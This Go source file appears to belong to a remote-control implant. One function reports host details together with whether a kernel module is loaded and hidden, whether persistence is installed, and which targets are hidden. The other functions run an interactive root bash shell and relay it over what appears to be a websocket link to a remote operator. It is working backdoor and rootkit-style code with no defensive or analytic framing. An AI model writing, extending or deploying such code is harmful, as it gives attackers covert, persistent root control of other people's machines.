package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"

	"github.com/creack/pty"
)

func handleInfoCmd() any {
	hostname, _ := os.Hostname()
	kernel, _ := os.ReadFile("/proc/sys/kernel/osrelease")
	state, stateErr := readKernelState()
	distro := readOSRelease()
	return map[string]any{
		"hostname":       hostname,
		"kernel":         strings.TrimSpace(string(kernel)),
		"arch":           runtime.GOARCH,
		"pid":            os.Getpid(),
		"uid":            os.Getuid(),
		"distro_id":      distro["ID"],
		"distro_release": distro["VERSION_CODENAME"],
		"has_headers":    headersInstalled(strings.TrimSpace(string(kernel))),
		"module_loaded":  stateErr == nil,
		"module_hidden":  state.moduleHidden,
		"persisted":      persistenceInstalled(),
		"hidden":         state.targets,
	}
}

func readOSRelease() map[string]string {
	fields := make(map[string]string)
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return fields
	}
	for _, line := range strings.Split(string(data), "\n") {
		k, v, ok := strings.Cut(line, "=")
		if !ok {
			continue
		}
		fields[k] = strings.Trim(v, `"'`)
	}
	return fields
}

func headersInstalled(kernel string) bool {
	_, err := os.Stat("/lib/modules/" + kernel + "/build/Makefile")
	return err == nil
}

var agentPTY struct {
	sync.Mutex
	file *os.File
}

func ptyStart() any {
	agentPTY.Lock()
	if agentPTY.file != nil {
		_ = agentPTY.file.Close()
	}
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Dir = "/root"
	cmd.Env = []string{
		"COLORTERM=truecolor", "HOME=/root", "LANG=C.UTF-8",
		"LOGNAME=root", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
		"SHELL=/bin/bash", "TERM=xterm-256color", "USER=root",
	}
	file, err := pty.StartWithSize(cmd, &pty.Winsize{Rows: 24, Cols: 80})
	if err != nil {
		agentPTY.Unlock()
		return fmt.Sprintf("ERR %v", err)
	}
	agentPTY.file = file
	agentPTY.Unlock()
	go streamPTYOutput(file)
	return "OK"
}

func streamPTYOutput(file *os.File) {
	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			agentPTY.Lock()
			active := agentPTY.file == file
			agentPTY.Unlock()
			if !active {
				return
			}
			frame := map[string]string{
				"pty": base64.StdEncoding.EncodeToString(buf[:n]),
			}
			wsSend(frame)
		}
		if err != nil {
			return
		}
	}
}

func ptyInput(b64 string) any {
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return "ERR invalid input"
	}
	agentPTY.Lock()
	defer agentPTY.Unlock()
	if agentPTY.file == nil {
		return "ERR no PTY"
	}
	agentPTY.file.Write(data)
	return "OK"
}

func ptyResize(arg string) any {
	var cols, rows uint16
	if _, err := fmt.Sscanf(arg, "%d %d", &cols, &rows); err != nil || cols == 0 || rows == 0 {
		return "ERR invalid size"
	}
	agentPTY.Lock()
	defer agentPTY.Unlock()
	if agentPTY.file == nil {
		return "ERR no PTY"
	}
	pty.Setsize(agentPTY.file, &pty.Winsize{Rows: rows, Cols: cols})
	return "OK"
}

func ptyClose() any {
	agentPTY.Lock()
	if agentPTY.file != nil {
		agentPTY.file.Close()
		agentPTY.file = nil
	}
	agentPTY.Unlock()
	return "OK"
}
